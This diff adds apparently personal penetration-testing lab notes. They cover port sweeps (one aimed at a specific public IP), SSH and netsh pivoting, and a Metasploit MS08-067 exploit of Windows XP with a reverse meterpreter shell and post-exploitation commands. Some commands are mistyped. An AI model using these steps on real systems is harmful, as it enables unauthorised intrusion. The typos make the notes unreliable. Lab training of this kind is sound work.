@@ -1,0 +1,175 @@
+Research sites:
+centralops.net || dnsstuff.com || network-tools.com || dnsgoodies.com || searchenginecolossus.com || mxtoolbox.com || traceroute.org || web.archive.org || cvedetails.com
+
+
+- Script your terminal
+	#> script -af namedsomething.txt
+
+- check for ports/services
+	Ping Sweep
+		#> nmap -sn <IP-range>
+			On Windows XP:
+		 	  #> for /L %i in (1,11024) do @((netsh diag connect iphost 192.168.1.100%i)&(echo quit))
+			Windows Vista:
+			  #> 1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("192.168.1.100",$_))"$_is open"} 2>null
+			Linux:
+			  #> for i in {1..446}; do echo >/dev/tcp/206.226.104.79/$i && echo $i open; done 2>/dev/null
+	Service/Port scan	
+		#> nmap -sV -n -P0 <ip.addr>
+		        -sV = service/version 
+			-n = no address resolution -P0= no ping
+
+- Shells through Several hops (forward ports to view a web page on Hop 3:)
+
+	1-@_KALI:  		#> ssh user@Hop-1
+	2-@_Hop-1:		#> ssh user@Hop-2 -NfL 9999:<HOP-3-IP-ADDR>:80
+	3-@_KALI:		#> ssh user@Hop-1 -NfL 8080:127.0.0.1:9999
+		4 web-broswer:  127.0.0.1:8080 will view <HOP3-IP:80>
+
+ _________	           ____________                     _________                ___________
+|    _ssh*|---------->|22          |                   |  Hop 2  |              |           |
+| Kali    |           |   \ssh----*|---------------->22|----------<9999------>80|   Hop 3   |
+|_______<8080---------|*---------<9999---------------9999-<-/    |              |           |
+                      |   Hop 1    |                   |_________|              |           | 
+      	              |____________|                                            |___________|
+
+
+	- Forward SSH Tunneling:
+		#> ssh user@<IP.ADDR> -L 9000:127.0.0.1:80 		
+			- 127.0.0.1:9000 loops to <user@IP.ADDR>:80
+		#> ssh user@<IP.ADDR> -L 9000:imgur.com:80 		
+			- if imgur was blocked by FW; I can use a grey-space server to view imgur.com:9000 which will forward me through <user@IP.ADDR>:80
+
+	- Reverse SSh Tunneling:
+		#> ssh user@10.0.0.6> -R 9001:192.39.0.7:80		
+			- Whoever connects to 10.0.0.6:9001 will be tunneled through my private network to 192.39.0.7:80
+
+
+============================================================================
+	      *****    Exploit through Ubuntu    *****
+============================================================================
+ #kali> ssh student@10.0.0.130 -L 5445:10.0.0.80:445 -R 8080:0.0.0.0:8080
+
+		- ssh to Ubuntu (.130), listen on MY KALI port (RPORT) 5445; route that to <TARGET_IP>:445
+		- allow MSF to send back CONNECTION to my KALI; "-R 8080" = (Ubuntu:8080); 0.0.0.0:8080 - send to Kali:8080
+ ON KALI: 	
+	SET PAYLOAD-INSTRUCTIONS (FOR XP):
+		#> RHOST 127.0.0.1 || RPORT 5445
+		#> LHOST (redirector=10.0.0.130) || LPORT 8080 
+
+ ________           __________           ___________
+| 5445->*|----->22-|--------\ |         |           |
+| Kali   |         |         *>-------->|445        |
+|_______8080<------|*-----8080|<------- |*/         |
+10.0.0.110         |          |         |           |
+		               | UBUNTU   |         | WinXP tgt | 
+		               |__________|         |___________| 
+		                  .130		              .80
+
+Payload INFO:
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+		RHOST & RPORT = From Kali to the redirector
+-------------------------------------------------------------------------------------------------------------------------------------------------------	
+		LHOST & LPORT = From TARGET back to redirector 
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+============================================================================
+                  ***** Exploit WinXP-netapi through Windows *****
+============================================================================
+From Windows 7 (redirector):
+#> netsh interface portproxy add v4tov4 listenport=2929 listenaddress=0.0.0.0 connectport=445 connectaddress=10.0.0.80
+#> netsh interface portporxy add v4tov4 listenport=3939 listenaddress=0.0.0.0 connectport=3939 connectaddress=10.0.0.110
+
+ON KALI: 	
+	SET PAYLOAD:
+		#> RHOST 10.0.0.50 || RPORT 5445
+		#> LHOST 10.0.0.50 || LPORT 3939 
+
+	 ________	            _________                ___________
+	| 5445->*|------>2929|------->*|------------->|445        |
+	| Kali   |           |  Win7   |              | /         |
+	|_______<-3939-------|*<-----3939<------------|*          |
+	10.0.0.110           |_________|              | WinXP tgt | 
+	      		               .50  	              |___________|
+							                                        .80
+
+============================================================================================================================================================
+============================================================================================================================================================
+
+	*****            2 HOPS THIS TIME	         *****
+============================================================================
+1 - From Kali:
+#> ssh student@10.0.0.130 -L 5445:10.0.0.50:6969 -R 7979:0.0.0.0:7979
+
+2 - From Windows 7
+#> netsh interface portproxy add v4tov4 listenport=6969 listenaddress=0.0.0.0 connectport=445 connectaddress=10.0.0.80
+#> netsh interface portporxy add v4tov4 listenport=7979 listenaddress=0.0.0.0 connectport=7979 connectaddress=10.0.0.130
+
+
+ ________	            ____________                     _________                ___________
+| 5445->*|---------->|22________ *|-------------->6969|--WIN-7-*|------------->|445        |
+| Kali   |           | \          |                   |         |              | /         |
+|________|<-7979-----|*--uBUNTU---|<-7979-------------|*--------|<-7979*-------|*          |
+10.0.0.110           |            |                   |_________|              | WinXP tgt | 
+      		           |____________|                       .50                  |___________|
+			                   .130			                                                 .80
+
+3 - Set MSF PAYLOAD
+	- set rhost 127.0.0.1
+	- set rport 5445
+	- set lport 7979
+	- set lhost 10.0.0.50
+--------------------------------------------------------------------------------------------------------------------------------------------------------
+
+- METERPRETER ON WINDOWS XP
+	#> msfconsole
+	#> search smb_version
+	#> search type:exploit smb
+	- load scanner
+		#> use auxiliary/scanner/smb/smber_version
+		#> show options
+		#> set rhosts <tgt.ip>
+		#> run
+		#> use exploit/windows/smb/ms08_067_netapi (only works on XP2)
+			#> set payload windows/meterpreter/reverse_tcp
+			#> set lhost <Kali_IP>
+			#> set lport <LPORT_of_Kali>
+			#> set rhost <target-IP>
+			#> set target 4 (or show options; then select target 4)
+			#> exploit
+				- METERPRETER COMMANDS
+				#> For Meterpreter commands:  enter [?]
+				#> getuid 						(privileges)
+				#> getsystem 						(SYSTEM priv accounts)
+				#> sysinfo						(systeminfo)
+				#> getpid 						(processes)
+				#> idletime 						(active users? - relative to privilege level)
+				#> getpid - *look for explorer or rdpclip* 		(evidence of active user)
+				#> search -f <calc*>					(find calculator)
+					- post exploitation scripts:
+					/usr/share/metasploit-framework/scripts/meterpreter 	(kali)
+					/apps/pro/msf3/scripts/meterpreter			(backtrack)
+
+				- Migrate Meterpreter to a SYSTEM level SVCHOST
+					#> shell
+					#> execute -f cmd.exe -i -H
+						-FROM COMMAND PROMPT:  Refer to Windows Cheat sheet
+							#> secedit 			(security products)
+							#> auditpol			(security info)
+							#> copy C:/program files	(programs)
+-msfvenvom
+	#> msfvenom -h
+	#> msfvenom -l <mod_type> 		(list payloads, modules, nops all
+	#> msfvenom -p <payload> -o 	(show opt for payloads)
+	#> msfvenom --help-formats 	(exe,dll, etc)
+
+
+
+
+
+
+
+			 
+					
